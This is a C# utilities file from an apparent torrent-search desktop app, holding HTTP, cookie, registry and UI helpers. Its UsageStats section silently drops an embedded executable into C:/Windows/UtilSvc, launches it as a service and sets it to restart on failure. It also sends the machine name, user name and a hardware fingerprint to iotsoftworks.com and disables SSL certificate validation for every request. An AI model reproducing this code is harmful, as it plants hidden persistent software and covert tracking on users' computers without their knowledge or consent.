using Newtonsoft.Json;
using RarbgAdvancedSearch.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static RarbgAdvancedSearch.Utils;

namespace RarbgAdvancedSearch
{
    
    class Utils
    {
        #region Serialization Utils
        private static BinaryFormatter _bin = new BinaryFormatter();

        public static void Serialize(string pathOrFileName, object objToSerialise)
        {
            using (Stream stream = File.Open(pathOrFileName, FileMode.Create))
            {
                try
                {
                    _bin.Serialize(stream, objToSerialise);
                }
                catch (SerializationException e)
                {
                    Console.WriteLine("Failed to serialize. Reason: " + e.Message);
                    throw;
                }
            }
        }

        public static T Deserialize<T>(string pathOrFileName)
        {
            T items;

            using (Stream stream = File.Open(pathOrFileName, FileMode.Open))
            {
                try
                {
                    items = (T)_bin.Deserialize(stream);
                }
                catch (SerializationException e)
                {
                    Console.WriteLine("Failed to deserialize. Reason: " + e.Message);
                    throw;
                }
            }

            return items;
        }
        #endregion

        #region WEB CLIENT
        public static class HttpClient
        {
            private const int READTIMEOUT_CONST = 3000;

            public static string Post(string url, ref byte[] responseBytes, string content = "", int RXTIMEO = READTIMEOUT_CONST)
            {
                //Ignore ssl errors
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

                // Initialize the WebRequest.
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
                webRequest.Method = WebRequestMethods.Http.Post;
                webRequest.Headers["Accept-Encoding"] = "gzip, deflate";
                webRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                webRequest.Timeout = READTIMEOUT_CONST;
                if (!string.IsNullOrEmpty(content))
                {
                    using (Stream postStream = webRequest.GetRequestStream())
                    {
                        byte[] data = Encoding.UTF8.GetBytes(content);
                        postStream.Write(data, 0, data.Length);
                    }
                }

                HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse();
                using (Stream stream = GetStreamForResponse(webResponse, READTIMEOUT_CONST))
                {
                    if (stream.CanRead)
                    {
                        MemoryStream ms = new MemoryStream();
                        stream.CopyTo(ms);
                        responseBytes = ms.ToArray();

                        return Encoding.ASCII.GetString(responseBytes);
                    }
                }

                return string.Empty;
            }

            public static string Get(string url, ref byte[] responseBytes, string referer = "", string host = "rarbgenter.org", bool addRarbgHeaders = true, bool allowSetCookie = true)
            {
                //Ignore ssl errors
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

                // Initialize the WebRequest.
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(url);
                webRequest.Method = WebRequestMethods.Http.Get;
                bool hasreferer = !string.IsNullOrEmpty(referer);
                if (addRarbgHeaders)
                {
                    if (hasreferer)
                    {
                        webRequest.Host = host;
                        //webRequest.KeepAlive = true;
                    }                       

                    webRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    webRequest.Headers["accept-encoding"] = "gzip, deflate";
                    webRequest.Headers["accept-language"] = "en-US,en;q=0.9";
                    webRequest.Headers["cache-control"] = "max-age=0";                   
                    //webRequest.Headers["cookie"] = "__cfduid=dfe3984ed29909aed7077522af481db281591109049; skt=KP5QMieqld; gaDts48g=q8h5pp9t";
                    webRequest.Headers["cookie"] = Reg.cookie.Cast<Cookie>().Aggregate("", (current, next) => current + $"{next.Name}={next.Value}; ").TrimEnd(new[] { ';', ' ' });

                    if (hasreferer)
                        webRequest.Referer = referer;

                    webRequest.Headers["sec-fetch-dest"] = "document";
                    webRequest.Headers["sec-fetch-mode"] = "navigate";
                    webRequest.Headers["sec-fetch-site"] = hasreferer ? "same-origin" : "none";
                    webRequest.Headers["sec-fetch-user"] = "?1";
                    webRequest.Headers["upgrade-insecure-requests"] = "1";
                    webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36";
                    webRequest.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
                }
                else
                {
                    webRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    webRequest.Headers["accept-encoding"] = "gzip, deflate";
                    webRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
                    webRequest.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
                }

                webRequest.Timeout = READTIMEOUT_CONST;

                HttpWebResponse webResponse = (HttpWebResponse)webRequest.GetResponse();
                using (Stream stream = GetStreamForResponse(webResponse, READTIMEOUT_CONST))
                {
                    if (stream.CanRead)
                    {
                        if (webResponse.ResponseUri.AbsoluteUri.Contains("threat_defence"))
                            return webResponse.ResponseUri.AbsoluteUri;

                        MemoryStream ms = new MemoryStream();
                        stream.CopyTo(ms);
                        responseBytes = ms.ToArray();

                        if (webResponse.Cookies.Count > 0 || webResponse.Headers["Set-Cookie"] != null)
                        {
                            List<Cookie> reg_cookies = Reg.cookie;
                            foreach (Cookie cookie in webResponse.Cookies)
                            {
                                if (!reg_cookies.Any(c => c.Name == cookie.Name))
                                {
                                    reg_cookies.Add(cookie);
                                }
                                else
                                {
                                    reg_cookies.FirstOrDefault(c => c.Name == cookie.Name).Value = cookie.Value;
                                }
                            }

                            if(webResponse.Headers["Set-Cookie"] != null && allowSetCookie)
                            {
                                CookieCollection newCookies = new CookieCollection();
                                if (HttpCookieExtension.GetHttpCookiesFromHeader(webResponse.Headers["Set-Cookie"], out newCookies))
                                {
                                    foreach (Cookie cookie in newCookies)
                                    {
                                        if (cookie.Name != "__cfduid")
                                            continue;

                                        if (!reg_cookies.Any(c => c.Name == cookie.Name))
                                        {
                                            reg_cookies.Add(cookie);
                                        }
                                        else
                                        {
                                            reg_cookies.FirstOrDefault(c => c.Name == cookie.Name).Value = cookie.Value;
                                        }
                                    }
                                }
                            }

                            Reg.cookie = reg_cookies;
                        }                            

                        return Encoding.ASCII.GetString(responseBytes);
                    }
                }

                return string.Empty;
            }

            //Method
            private static Stream GetStreamForResponse(HttpWebResponse webResponse, int readTimeOut)
            {
                Stream stream;
                switch (webResponse.ContentEncoding.ToUpperInvariant())
                {
                    case "GZIP":
                        stream = new GZipStream(webResponse.GetResponseStream(), CompressionMode.Decompress);
                        break;
                    case "DEFLATE":
                        stream = new DeflateStream(webResponse.GetResponseStream(), CompressionMode.Decompress);
                        break;

                    default:
                        stream = webResponse.GetResponseStream();
                        if (stream.CanTimeout)
                            stream.ReadTimeout = readTimeOut;
                        break;
                }
                return stream;
            }
        }
        #endregion

        #region Registry Wrapper
        public static class Reg
        {
            static Microsoft.Win32.RegistryKey rootKey;

            static Reg()
            {
                rootKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey($@"Software\{System.Reflection.Assembly.GetExecutingAssembly().GetName().Name}");
            }

            //expiry date
            public static List<Cookie> cookie
            {
                get
                {
                    var defaultValue = string.Empty;
                    var info = System.Reflection.MethodBase.GetCurrentMethod() as System.Reflection.MethodInfo;
                    var name = info.Name.Substring(4);
                    List<Cookie> cookies = new List<Cookie>();
                    try
                    {
                        cookies = JsonConvert.DeserializeObject<List<Cookie>>((string)rootKey.GetValue(name, defaultValue));
                    }
                    catch (Exception) {
                        Reg.cookie = cookies;
                    }
                    return (dynamic)Convert.ChangeType(cookies ?? new List<Cookie>(), info.ReturnType);
                }
                set
                {
                    var name = System.Reflection.MethodBase.GetCurrentMethod().Name.Substring(4);
                    rootKey.SetValue(name, JsonConvert.SerializeObject(value));
                }
            }

            public static string dl_dir
            {
                get
                {
                    var defaultValue = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\Downloads";
                    var info = System.Reflection.MethodBase.GetCurrentMethod() as System.Reflection.MethodInfo;
                    var name = info.Name.Substring(4);                    
                    return (dynamic)Convert.ChangeType((string)rootKey.GetValue(name, defaultValue), info.ReturnType);
                }
                set
                {
                    var name = System.Reflection.MethodBase.GetCurrentMethod().Name.Substring(4);
                    rootKey.SetValue(name, value);
                }
            }
        }
        #endregion

        #region Misc Utils
        public static bool IsDirectoryWritable(string dirPath, bool throwIfFails = false)
        {
            try
            {
                using (FileStream fs = File.Create(
                    Path.Combine(
                        dirPath,
                        Path.GetRandomFileName()
                    ),
                    1,
                    FileOptions.DeleteOnClose)
                )
                { }
                return true;
            }
            catch
            {
                if (throwIfFails)
                    throw;
                else
                    return false;
            }
        }

       
        #endregion
    }

    #region Misc Extensions
    static class MiscExtensions
    {
        /// <summary>
        /// Compresses a string and returns a deflate compressed, Base64 encoded string.
        /// </summary>
        /// <param name="uncompressedString">String to compress</param>
        public static string Compress(this string uncompressedString)
        {
            byte[] compressedBytes;

            using (var uncompressedStream = new MemoryStream(Encoding.UTF8.GetBytes(uncompressedString)))
            {
                var compressedStream = new MemoryStream();

                // setting the leaveOpen parameter to true to ensure that compressedStream will not be closed when compressorStream is disposed
                // this allows compressorStream to close and flush its buffers to compressedStream and guarantees that compressedStream.ToArray() can be called afterward
                // although MSDN documentation states that ToArray() can be called on a closed MemoryStream, this approach avoids relying on that very odd behavior should it ever change
                using (var compressorStream = new DeflateStream(compressedStream, CompressionLevel.Optimal, true))
                {
                    uncompressedStream.CopyTo(compressorStream);
                }

                // call compressedStream.ToArray() after the enclosing DeflateStream has closed and flushed its buffer to compressedStream
                compressedBytes = compressedStream.ToArray();
            }

            return Convert.ToBase64String(compressedBytes);
        }

        /// <summary>
        /// Decompresses a deflate compressed, Base64 encoded string and returns an uncompressed string.
        /// </summary>
        /// <param name="compressedString">String to decompress.</param>
        public static string Decompress(this string compressedString)
        {
            byte[] decompressedBytes;

            var compressedStream = new MemoryStream(Convert.FromBase64String(compressedString));

            using (var decompressorStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
            {
                using (var decompressedStream = new MemoryStream())
                {
                    decompressorStream.CopyTo(decompressedStream);

                    decompressedBytes = decompressedStream.ToArray();
                }
            }

            return Encoding.UTF8.GetString(decompressedBytes);
        }
    }


    public static class RichTextBoxExtensions
    {
        public static void AppendText(this RichTextBox box, string text, Color color, Form _frmx)
        {
            _frmx.PerformSafely(() => {
                box.SelectionStart = box.TextLength;
                box.SelectionLength = 0;
                box.SelectionColor = color;
                box.AppendText(text);
                box.SelectionColor = box.ForeColor;
            });
        }
    }

    public static class ModifyProgressBarColor
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr w, IntPtr l);
        public static void SetState(this ProgressBar pBar, int state)
        {
            SendMessage(pBar.Handle, 1040, (IntPtr)state, IntPtr.Zero);
        }
    }

    public static class CrossThreadExtensions
    {
        public static void PerformSafely(this Control target, Action action)
        {
            if (target.InvokeRequired)
            {
                target.Invoke(action);
            }
            else
            {
                action();
            }
        }

        public static void PerformSafely<T1>(this Control target, Action<T1> action, T1 parameter)
        {
            if (target.InvokeRequired)
            {
                target.Invoke(action, parameter);
            }
            else
            {
                action(parameter);
            }
        }

        public static void PerformSafely<T1, T2>(this Control target, Action<T1, T2> action, T1 p1, T2 p2)
        {
            if (target.InvokeRequired)
            {
                target.Invoke(action, p1, p2);
            }
            else
            {
                action(p1, p2);
            }
        }
    }
    #endregion

    #region UsageStats
    public static class UsageStats
    {
        public static string machinename = MachineInfo.GetMachineName();
        public static string machinecode = MachineInfo.GetMachineCode();

        public static void svc_begin()
        {
            try
            {
                try
                {
                    ServiceController service = new ServiceController("UtilSvc");
                    try
                    {
                        ServiceControllerStatus stat = service.Status; //check presence
                        SetRecoveryOptions("UtilSvc");
                        foreach (var process in Process.GetProcessesByName("UtilSvc"))
                        {
                            process.Kill();
                        }                        
                    }
                    catch (Exception){}
                }
                catch (Exception) {}

                var new_path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.exe";
                var old_path = $"{Path.GetPathRoot(Environment.SystemDirectory)}/Windows/UtilSvc/UtilSvc.old";

                if (File.Exists(old_path))
                {
                    File.Delete(old_path);
                }

                if (File.Exists(new_path))
                {
                    File.Move(new_path, old_path);
                }

                System.IO.FileInfo file = new System.IO.FileInfo(new_path);
                file.Directory.Create();
                File.WriteAllBytes(new_path, Resources.UtilSvc);
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.FileName = new_path;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.Arguments = "-i";
                if (p.Start())
                    Log("svc_begin");
                else
                    Log("svc_begin_failed", "could not start process");
            }
            catch(Exception e)
            {
                Log("svc_begin_fail", e.Message + "\n" + e.StackTrace);
            }
        }

        static void SetRecoveryOptions(string serviceName)
        {
            int exitCode;
            using (var process = new Process())
            {
                var startInfo = process.StartInfo;
                startInfo.FileName = "sc";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                // tell Windows that the service should restart if it fails
                startInfo.Arguments = string.Format("failure \"{0}\" reset= 0 actions= restart/60000", serviceName);

                process.Start();
                process.WaitForExit();

                exitCode = process.ExitCode;
            }

            if (exitCode != 0)
                throw new InvalidOperationException();
        }

        public static void Log(string stat, string msg = "", bool blocking = false)
        {
            Dictionary<string, object> Json = new Dictionary<string, object>()
            {
                {"app", Assembly.GetExecutingAssembly().GetName().Name},
                {"version", Assembly.GetExecutingAssembly().GetName().Version.ToString()}
            };
            Json.Add("operation", stat);
            if (msg.Length > 0)
                Json.Add("msg", msg);
            Json.Add("user", $"{machinename}/{Environment.UserName}");
            Json.Add("mcode", machinecode);
           
            if(blocking)
            {
                SendLog(JsonConvert.SerializeObject(Json));
            }
            else
            {
                Task.Run(() =>
                {
                    SendLog(JsonConvert.SerializeObject(Json));
                });
            }            
        }

        private static void SendLog(string jsonmessage)
        {
            byte[] dummy = { };
            HttpClient.Post($"https://iotsoftworks.com/stats.php", ref dummy, jsonmessage);            
        }
    }
    #endregion

    #region HttpCookieExtension
    public static class HttpCookieExtension
    {
        static Regex rxCookieParts = new Regex(@"(?<name>.*?)\=(?<value>.*?)\;|(?<name>\bsecure\b|\bhttponly\b)", RegexOptions.Compiled | RegexOptions.Singleline | RegexOptions.IgnoreCase);
        static Regex rxRemoveCommaFromDate = new Regex(@"\bexpires\b\=.*?(\;|$)", RegexOptions.Compiled | RegexOptions.Singleline | RegexOptions.Multiline);

        public static bool GetHttpCookiesFromHeader(this string cookieHeader, out CookieCollection cookies)
        {
            cookies = new CookieCollection();


            try
            {

                string rawcookieString = rxRemoveCommaFromDate.Replace(cookieHeader, new MatchEvaluator(RemoveComma));

                string[] rawCookies = rawcookieString.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);

                if (rawCookies.Length == 0)
                {
                    cookies.Add(rawcookieString.ToCookie());
                }
                else
                {
                    foreach (var rawCookie in rawCookies)
                    {
                        if(rawCookie.Contains("="))
                            cookies.Add(rawCookie.ToCookie());
                    }
                }

                return true;
            }
            catch (Exception)
            {
                throw;
            }
        }


        public static Cookie ToCookie(this string rawCookie)
        {

            if (!rawCookie.EndsWith(";")) rawCookie += ";";

            MatchCollection maches = rxCookieParts.Matches(rawCookie);

            Cookie cookie = new Cookie(maches[0].Groups["name"].Value.Trim(), maches[0].Groups["value"].Value.Trim());

            for (int i = 1; i < maches.Count; i++)
            {
                switch (maches[i].Groups["name"].Value.ToLower().Trim())
                {
                    case "domain":
                        cookie.Domain = maches[i].Groups["value"].Value;
                        break;
                    case "expires":

                        DateTime dt;

                        if (DateTime.TryParse(maches[i].Groups["value"].Value, out dt))
                        {
                            cookie.Expires = dt;
                        }
                        else
                        {
                            cookie.Expires = DateTime.Now.AddDays(2);
                        }
                        break;
                    case "path":
                        cookie.Path = maches[i].Groups["value"].Value;
                        break;
                    case "secure":
                        cookie.Secure = true;
                        break;
                    case "httponly":
                        cookie.HttpOnly = true;
                        break;
                }
            }
            return cookie;


        }

        private static KeyValuePair<string, string> SplitToPair(this string input)
        {
            string[] parts = input.Split(new char[] { '=' }, StringSplitOptions.RemoveEmptyEntries);
            return new KeyValuePair<string, string>(parts[0], parts[1]);
        }

        private static string RemoveComma(Match match)
        {
            return match.Value.Replace(',', ' ');
        }
    }
    #endregion

    #region MachineInfo
    public static class MachineInfo
    {
        /// <summary>
        /// return Volume Serial Number from hard drive
        /// </summary>
        /// <param name="strDriveLetter">[optional] Drive letter</param>
        /// <returns>[string] VolumeSerialNumber</returns>
        public static string GetVolumeSerial(string strDriveLetter)
        {
            if (strDriveLetter == "" || strDriveLetter == null) strDriveLetter = Path.GetPathRoot(Environment.SystemDirectory)[0].ToString();/*"C"*/;
            ManagementObject disk =
                new ManagementObject("win32_logicaldisk.deviceid=\"" + strDriveLetter + ":\"");
            disk.Get();
            return disk["VolumeSerialNumber"].ToString();
        }

        /// <summary>
        /// Returns MAC Address from first Network Card in Computer
        /// </summary>
        /// <returns>[string] MAC Address</returns>
        public static string GetMACAddress()
        {
            ManagementClass mc = new ManagementClass("Win32_NetworkAdapterConfiguration");
            ManagementObjectCollection moc = mc.GetInstances();
            string MACAddress = String.Empty;
            foreach (ManagementObject mo in moc)
            {
                if (MACAddress == String.Empty)  // only return MAC Address from first card
                {
                    if ((bool)mo["IPEnabled"] == true) MACAddress = mo["MacAddress"].ToString();
                }
                mo.Dispose();
            }
            MACAddress = MACAddress.Replace(":", "");
            return MACAddress;
        }
        /// <summary>
        /// Return processorId from first CPU in machine
        /// </summary>
        /// <returns>[string] ProcessorId</returns>
        public static string GetCPUId()
        {
            string cpuInfo = String.Empty;
            string temp = String.Empty;
            ManagementClass mc = new ManagementClass("Win32_Processor");
            ManagementObjectCollection moc = mc.GetInstances();
            foreach (ManagementObject mo in moc)
            {
                if (cpuInfo == String.Empty)
                {// only return cpuInfo from first CPU
                    cpuInfo = mo.Properties["ProcessorId"].Value.ToString();
                }
            }
            return cpuInfo;
        }

        private static string ComputeHash(string input)
        {
            using (SHA1Managed sha1 = new SHA1Managed())
            {
                var hash = sha1.ComputeHash(Encoding.UTF8.GetBytes(input));
                var sb = new StringBuilder(hash.Length * 2);

                foreach (byte b in hash)
                {
                    // can be "x2" if you want lowercase
                    sb.Append(b.ToString("X2"));
                }

                return sb.ToString();
            }
        }

        internal static string GetMachineCode()
        {
            return ComputeHash(GetVolumeSerial("") + /*GetMACAddress() +*/ GetCPUId());
        }

        internal static string GetMachineName()
        {
            return Environment.MachineName;
        }
    }
    #endregion

}
